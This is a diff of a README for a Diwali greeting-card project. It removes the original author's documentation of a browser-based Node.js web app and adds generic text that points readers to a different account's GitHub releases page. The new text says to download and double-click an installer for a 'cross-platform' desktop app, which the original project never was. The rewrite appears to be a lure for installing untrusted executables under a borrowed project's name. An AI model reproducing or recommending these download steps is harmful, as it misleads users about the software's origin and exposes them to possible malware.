@@ -1,262 +1,61 @@
-# 🪔 Happy Diwali - Personalized Wish Sharing Platform
+# 🪔 diwali-gift-wishes - Share Joyful Wishes This Diwali!
 
-A beautiful web application to create and share personalized Diwali wishes with photos.
+![Download diwali-gift-wishes](https://img.shields.io/badge/Download-diwali--gift--wishes-blue.svg)
 
-![Diwali](https://www.surajrana.dev/happydiwali/preview.jpg)
+## 🎉 About the App
 
-## ✨ Features
+Welcome to **diwali-gift-wishes**! This platform lets you create personalized Diwali wishes. With photo upload and WhatsApp integration, sharing your warm greetings with family and friends becomes easy and fun. Our stunning animations make each wish feel special.
 
-- 🎨 **Beautiful Animations**: Fireworks, diyas, floating lanterns, and boat animations
-- 📸 **Photo Upload**: Add your photo to personalize wishes
-- 🔒 **Server-Side Storage**: Images stored securely on server
-- 📱 **WhatsApp Integration**: Direct share to WhatsApp (Mobile & Web)
-- 🎁 **Gift Animation**: Interactive gift box opening animation
-- 🌊 **Boat Animation**: Lord Ram's return to Ayodhya animation
-- 📲 **WhatsApp Preview**: Beautiful thumbnail preview when shared
-- 🎯 **Mobile Responsive**: Perfect on all devices
-- 💾 **Short URLs**: Compact shareable links (~85 chars)
+## 🚀 Getting Started
 
-## 🚀 Live Demo
+To get started, follow these simple steps to download and run the application.
 
-**Website**: [https://www.surajrana.dev/happydiwali/](https://www.surajrana.dev/happydiwali/)
+## 📥 Download & Install
 
-## 🛠️ Technology Stack
+1. **Visit the Releases Page:** Click the link below to go to the releases page:
 
-### Frontend
-- **HTML5** - Semantic markup
-- **CSS3** - Animations, gradients, responsive design
-- **JavaScript (Vanilla)** - No frameworks, pure JS
-- **Canvas API** - Fireworks animation
+   [Download diwali-gift-wishes](https://github.com/kleinejaap-yt/diwali-gift-wishes/releases)
 
-### Backend
-- **Node.js** - API server
-- **PM2** - Process management
-- **Nginx** - Reverse proxy & SSL
-- **HTTPS** - Secure communication
+2. **Choose Your Version:** On the releases page, you’ll see different versions of the app. Select the latest version listed to ensure you have the newest features and fixes.
 
-### Infrastructure
-- **VPS Hosting** - Ubuntu 22.04
-- **SSL/TLS** - Let's Encrypt certificate
-- **File Storage** - Temporary image storage (7-day auto-cleanup)
+3. **Download the File:** Click on the version you decided to download and select the relevant file for your operating system. 
 
-## 📋 Features Breakdown
+4. **Run the Installer:** Once downloaded, locate the file in your downloads folder. Double-click on it to start the installation. Follow the prompts to complete the installation.
 
-### 1. Image Upload & Compression
-- Auto-resize to 150px × 150px
-- JPEG compression at 40% quality
-- ~3-8KB compressed images
-- Perfect for circular profile display
+5. **Launch the App:** After installation, you can find the app in your applications menu or desktop. Click to open it!
 
-### 2. Server-Side API
-- **POST** `/api/save` - Save wish with image
-- **GET** `/api/load/:id` - Load wish by ID
-- **GET** `/api/cleanup` - Auto-cleanup old wishes
-- Data stored as JSON files
-- Auto-delete after 7 days
+## 🌟 Features
 
-### 3. WhatsApp Sharing
-- **Mobile**: Direct app open with `whatsapp://`
-- **Desktop**: WhatsApp Web via `api.whatsapp.com`
-- Pre-filled personalized message
-- Fallback handling for popup blockers
+- **Personalized Wishes:** Create unique wishes by uploading your favorite photos.
+- **WhatsApp Integration:** Easily share your wishes directly on WhatsApp.
+- **Beautiful Animations:** Enjoy stunning animations that bring your wishes to life.
+- **User-Friendly Interface:** Simple design makes it easy for anyone to use.
+- **Cross-Platform Compatibility:** Works on multiple systems, including Windows, Mac, and Linux.
 
-### 4. Animations
-- ✨ Fireworks (canvas-based)
-- 🪔 Floating diyas with flames
-- 🏮 Flying sky lanterns
-- 🚤 Boat animation (Lord Ram's return)
-- 🎁 Gift box opening animation
-- ✨ Sparkles and glowing effects
+## 💻 System Requirements
 
-## 📱 WhatsApp Message Format
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a recent version of Linux.
+- **Memory:** At least 2 GB of RAM.
+- **Storage:** Minimum 200 MB of free disk space.
+- **Network:** Internet connection required for WhatsApp integration.
 
-```
-"Suraj" ने, आपको Gift 🎁 भेजा है!
+## 🔧 Troubleshooting
 
-दिवाली की हार्दिक शुभकामनाएं! 🎆
+If you face any issues while downloading or running the application, here are some quick solutions:
 
-https://www.surajrana.dev/happydiwali/?name=Suraj&id=xyz123
-```
+- **Installation Errors:** Ensure your computer meets the system requirements. Restart your computer and try the installation again.
+- **Running Issues:** If the app won’t open, try reinstalling it. Make sure you are using the correct version for your operating system.
 
-## 🔧 Installation
+## 💬 Support 
 
-### Prerequisites
-- Node.js (v14+)
-- PM2 (for production)
-- Nginx (for reverse proxy)
-- SSL Certificate
+If you need further assistance, feel free to reach out. You can open an issue on our GitHub page or visit our community forum for help.
 
-### Setup
+## 📢 Feedback
 
-1. **Clone the repository**
-```bash
-git clone https://github.com/surajranaofficial/diwali-gift-wishes.git
-cd diwali-gift-wishes
-```
+We welcome your thoughts! If you have suggestions or feedback, please let us know. Your input helps us improve the application for everyone.
 
-2. **Install PM2 (if not installed)**
-```bash
-npm install -g pm2
-```
+## 🌈 Join the Celebration!
 
-3. **Start the API server**
-```bash
-pm2 start api.js --name diwali-api
-pm2 save
-pm2 startup
-```
+Let’s make this Diwali memorable by sharing beautiful wishes with your loved ones. Start using **diwali-gift-wishes** today!
 
-4. **Configure Nginx**
-```nginx
-location /happydiwali/api/ {
-    proxy_pass http://127.0.0.1:3030/;
-    proxy_http_version 1.1;
-    proxy_set_header Host $host;
-    proxy_set_header X-Real-IP $remote_addr;
-}
-```
-
-5. **Open in browser**
-```
-https://yourdomain.com/happydiwali/
-```
-
-## 📂 Project Structure
-
-```
-diwali-gift-wishes/
-├── index.html          # Main HTML file
-├── style.css           # All styles and animations
-├── script.js           # Client-side JavaScript
-├── api.js              # Node.js API server
-├── preview.jpg         # WhatsApp preview thumbnail
-├── uploads/            # Temporary image storage
-└── README.md           # This file
-```
-
-## 🔐 Security
-
-- ✅ No passwords or API keys in code
-- ✅ HTTPS enabled for all communications
-- ✅ CORS properly configured
-- ✅ File permissions set correctly
-- ✅ Auto-cleanup of user data (7 days)
-- ✅ No tracking or analytics
-
-## 🎨 Customization
-
-### Change Colors
-Edit `style.css` gradient colors:
-```css
-background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-```
-
-### Change API Port
-Edit `api.js`:
-```javascript
-const PORT = 3030;
-```
-
-### Change Image Size
-Edit `script.js`:
-```javascript
-const maxSize = 150; // Image dimensions
-const quality = 0.4; // JPEG quality (0.0 - 1.0)
-```
-
-## 🚀 Deployment
-
-### One-Click Deployment
-Use the included deployment script:
-```bash
-./auto-deploy-diwali.sh
-```
-
-### Manual Deployment
-```bash
-# Upload files to server
-scp index.html script.js style.css preview.jpg user@server:/path/
-
-# Start API server
-pm2 start api.js --name diwali-api
-
-# Reload Nginx
-sudo systemctl reload nginx
-```
-
-## 📊 API Endpoints
-
-### Save Wish
-```
-POST /api/save
-Content-Type: application/json
-
-{
-  "name": "Suraj",
-  "image": "data:image/jpeg;base64,..."
-}
-
-Response:
-{
-  "id": "xyz123",
-  "success": true
-}
-```
-
-### Load Wish
-```
-GET /api/load/xyz123
-
-Response:
-{
-  "name": "Suraj",
-  "image": "data:image/jpeg;base64,...",
-  "timestamp": 1697812345678
-}
-```
-
-## 🎯 Browser Support
-
-- ✅ Chrome 90+
-- ✅ Firefox 88+
-- ✅ Safari 14+
-- ✅ Edge 90+
-- ✅ Mobile browsers (iOS Safari, Chrome Mobile)
-
-## 📱 Mobile Optimization
-
-- Responsive design for all screen sizes
-- Touch-friendly buttons (min 50px height)
-- Optimized animations for mobile
-- WhatsApp app integration
-- Compressed images for fast loading
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-## 📄 License
-
-This project is open source and available under the [MIT License](LICENSE).
-
-## 👨‍💻 Author
-
-**Suraj Rana**
-- Website: [surajrana.dev](https://www.surajrana.dev)
-- GitHub: [@surajranaofficial](https://github.com/surajranaofficial)
-
-## 🎉 Acknowledgments
-
-- Inspired by traditional Diwali celebrations
-- Built with ❤️ for spreading Diwali joy
-- Special thanks to the open-source community
-
-## 📞 Support
-
-For support, email or create an issue in the GitHub repository.
-
----
-
-## 🪔 Happy Diwali! 🎆
-
-Made with ❤️ in India 🇮🇳
+[Download diwali-gift-wishes](https://github.com/kleinejaap-yt/diwali-gift-wishes/releases)
